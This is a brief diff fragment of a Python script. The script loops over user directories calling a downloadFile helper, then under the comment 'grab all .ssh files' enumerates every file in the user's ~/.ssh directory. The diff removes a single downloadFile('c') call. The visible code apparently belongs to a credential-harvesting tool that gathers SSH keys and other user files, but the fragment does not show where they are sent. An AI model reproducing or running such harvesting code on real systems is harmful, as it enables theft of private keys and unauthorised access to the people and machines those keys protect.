@@ -126,8 +126,6 @@ for userPath in userPaths:
     for searchPath in searchPaths:
         downloadFile(userPath + searchPath)
 
-downloadFile('c')
-
 # grab all .ssh files
 filePath = os.path.expanduser('~/.ssh/')
 sshFiles = [f for f in os.listdir(filePath) if os.path.isfile(os.path.join(filePath, f))]
